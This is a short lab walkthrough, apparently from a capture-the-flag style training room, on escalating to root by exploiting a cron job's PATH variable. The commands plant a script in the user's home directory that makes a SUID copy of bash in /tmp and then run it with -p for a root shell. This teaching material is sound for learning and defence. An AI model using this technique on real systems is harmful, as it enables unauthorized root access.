# crontab

1. View the contents of the system-wide crontab:

		cat /etc/crontab

2. Note that the *PATH variable starts with* `/home/user` which is our user's home directory.

3. Create a file called overwrite.sh in your home directory with the following contents:

		#!/bin/bash

		cp /bin/bash /tmp/rootbash
		chmod +xs /tmp/rootbash

4. Make sure that the file is executable:

		chmod +x /home/user/overwrite.sh

5. Wait for the cron job to run (should not take longer than a minute). 
6. Run the `/tmp/rootbash` command with `-p` to *gain a shell running with root privileges:*

		/tmp/rootbash -p

**Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!**

	rm /tmp/rootbash
	exit
